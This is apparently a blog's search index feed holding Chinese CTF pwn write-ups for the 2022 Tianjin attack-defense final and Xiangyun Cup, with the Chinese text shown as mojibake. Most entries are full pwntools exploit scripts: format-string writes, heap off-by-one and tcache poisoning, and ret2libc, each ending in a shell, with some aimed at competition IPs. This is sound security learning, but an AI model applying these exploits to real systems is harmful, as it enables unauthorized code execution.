<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2022å¤©æ´¥å¸‚å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å†³èµ› pwn</title>
    <link href="/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/"/>
    <url>/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<p>æ¯”èµ›æ—¶é—´åªæœ‰3ä¸ªå°æ—¶ï¼Œè¿™é‡Œæˆ‘åªå†™å‡ºäº†echoã€heroï¼Œè¿˜ä¸€é“choiceæ²¡æ—¶é—´å»å†™äº†ï¼Œåç»­è‡ªå·±åœ¨æœ¬åœ°å¤ç°äº†ä¸€ä¸‹ã€‚</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><img src="/img/3/Screenshot_20221105_115756.png"></p><p>å…ˆåˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²è¯»å‡ºcanaryçš„å€¼ç»•è¿‡æ£€æŸ¥</p><p>åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²ä¿®æ”¹0x601068åœ°å€çš„å€¼ï¼Œä¿®æ”¹ä¸ºå­—ç¬¦ä¸²<code>/bin/sh\x00</code></p><p>å†åˆ©ç”¨æ ˆæº¢å‡ºå’Œsystemå‡½æ•°æ‰§è¡ŒROP</p><p><img src="/img/3/Screenshot_20221105_121837.png"></p><p>å¼€å§‹æˆ‘æƒ³ä¸€æ¬¡æ€§ä¿®æ”¹å¤šä¸ªå­—èŠ‚ï¼Œä½†å¥½åƒæœ‰canaryä»¥åŠç¼“å†²åŒºå¤ªå°ï¼Œæ‰€ä»¥æ¯æ¬¡åªä¿®æ”¹ä¸€ä¸ªå­—èŠ‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;echo&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./echo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50004</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>bss = <span class="hljs-number">0x601068</span><br><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;%11$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>bin_sh = <span class="hljs-number">0x0068732f6e69622f</span><br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%98c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">1</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%105c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">2</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%110c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">3</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%115c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">5</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%104c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">6</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">7</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br><br>payload = <span class="hljs-string">b&#x27;quit&#x27;</span>.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) +  p64(<span class="hljs-number">0x4005e9</span>) + p64(<span class="hljs-number">0x400903</span>) + p64(bss) + p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hero"><a href="#hero" class="headerlink" title="hero"></a>hero</h3><p>åœ¨editå‡½æ•°ä¸­æœ‰ä¸ªå•å­—èŠ‚æº¢å‡º</p><p><img src="/img/3/Screenshot_20221105_120111.png"></p><p>å¯ä»¥ä¼ªé€ ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„prev_sizeå¤§å°å’Œsizeå°¾å­—èŠ‚ä¸º\x00ï¼Œåœ¨ç”³è¯·é‡Šæ”¾ä¼šæœ¬æ¥æ­£å¸¸ç”³è¯·çš„å †å—åˆå¹¶ã€‚</p><p>æœ€ååˆ©ç”¨fastbinäºŒæ¬¡é‡Šæ”¾ï¼ŒæŒ‡å‘malloc_hookï¼Œ<code>__realloc_hookæ”¹ä¸ºonegadget</code> ï¼Œ <code>__malloc_hookæ”¹ä¸º__libc_reallo</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hero&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc_64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./hero&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50005</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x170</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>libc_reallo = libcbase + <span class="hljs-number">0x846c0</span><br>onegadget = libcbase + <span class="hljs-number">0xf1117</span><br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>edit(<span class="hljs-number">1</span> ,<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(p64(malloc_hook - <span class="hljs-number">0x23</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">11</span> + p64(onegadget) + p64(libc_reallo + <span class="hljs-number">6</span>)<br>add(payload ,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><p>æœ¬åœ°å¤ç°ç¯å¢ƒï¼š2.23-0ubuntu11.3_i386</p><p>åœ¨æ­¤è¾“å…¥æ—¶åˆ©ç”¨æœ€åä¸€ä¸ªå­—èŠ‚å³å¯è¦†ç›–nbytesçš„å€¼ï¼Œç„¶ååœ¨ä¸‹ä¸€æ¬¡è¾“å…¥æ—¶è®©å…¶æ ˆæº¢å‡ºï¼Œæœ€året2libc</p><p><img src="/img/3/Screenshot_20221105_104723.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./choice&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>pay = <span class="hljs-string">b&#x27;a&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x50&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(<span class="hljs-number">0x80485bb</span>) + p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>leak = u32(p.recv(<span class="hljs-number">4</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(sys_addr) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¥¥äº‘æ¯2022 sandboxheapå’Œbitheapk</title>
    <link href="/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/"/>
    <url>/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘æ˜¯å…ˆå†™çš„sandboxheapï¼Œå¼€å§‹è¿˜ä»¥ä¸ºsandboxæ–‡ä»¶æ˜¯å¤šä½™çš„ï¼Œå°±ç›´æ¥å•ç‹¬æ‹¿sandboxheapå»å†™ï¼Œå°±åœ¨æœ¬åœ°æ‰“é€šåï¼Œå‘ç°è¿œç¨‹æ˜¯æœ‰é€šè¿‡sandboxå»æ‰§è¡Œsandboxheapï¼Œå½“æ—¶æˆ‘å°±æ²¡èƒ½å†™å‡ºæ¥ã€‚</p><p>å±±é‡æ°´å¤ç–‘æ— è·¯ï¼ŒæŸ³æš—èŠ±æ˜åˆä¸€æ‘ï¼æ²¡æƒ³åˆ°bitheapæ¼æ´å’Œsandboxheapä¸€æ¨¡ä¸€æ ·ï¼Œè€Œä¸”æ²¡æœ‰sandboxï¼Œå½“æ—¶å°±åªå†™å‡ºäº†bitheapã€‚</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¿™ä¸¤é“é¢˜éƒ½æ˜¯ä¸€æ ·çš„æ¼æ´ï¼Œä¸»è¦æ˜¯çœ‹æ‡‚ç¼–è¾‘å‡½æ•°ä¸­çš„æº¢å‡ºå’ŒåŠ å¯†ï¼š</p><p>å¦‚ä¸‹å›¾å°†å †å—å†™å…¥æ•°æ®çš„å¤§å°ä¹˜8 ï¼Œç„¶ååŠ 1ï¼›æœ€åæ˜¯é€šè¿‡åŸºäºè¾“å…¥çš„8ä¸ªå­—ç¬¦å»å¯¹å †ä¸­çš„ä¸€ä¸ªå­—èŠ‚è¿›è¡Œä½è¿ç®—ï¼Œæ¯ä¸ªå­—ç¬¦å¯ä»¥æ“ä½œå †ä¸­ä¸€ä¸ªå­—èŠ‚çš„ä¸€ä½ï¼›æœ€åä¼šå¤šå‡ºä¸€ä¸ªå­—èŠ‚å½±å“ä¸‹ä¸€ä¸ªå †å—çš„size</p><p><img src="/img/4/Screenshot_20221105_024929.png"></p><p>å¦‚ä¸‹å›¾sub_C61å‡½æ•°ï¼ŒåŸºäºå †å—ä¸­çš„å­—ç¬¦æ¥ä½è¿ç®—ï¼Œä½†å †å—åˆå§‹å€¼éƒ½æ˜¯<code>0</code>ï¼Œæœ€åè¢«å†™å…¥å †å—çš„ä¹Ÿæ˜¯0  ï¼›å¦‚æœè¾“å…¥çš„æ˜¯<code>\x31</code>å­—ç¬¦ä¼šè®©æœ€åè¢«å†™å…¥å †å—çš„çš„æ˜¯1ã€‚</p><p><img src="/img/4/Screenshot_20221105_025735.png"></p><h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bitheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process([&#x27;./sandbox&#x27;,&#x27;./sandboxheap&#x27;])</span><br><span class="hljs-comment">#p = process(&#x27;./bitheap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;39.106.13.71&#x27;</span>,<span class="hljs-number">42991</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    pay = u64(pay)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">1</span>, key(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">3</span>, key(p64(sys_addr)))<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h3><p>æœªå®Œå¾…ç»­â€¦â€¦</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF å…¬å¼€èµ›Week4 pwn è¿™æ˜¯å †ğŸ</title>
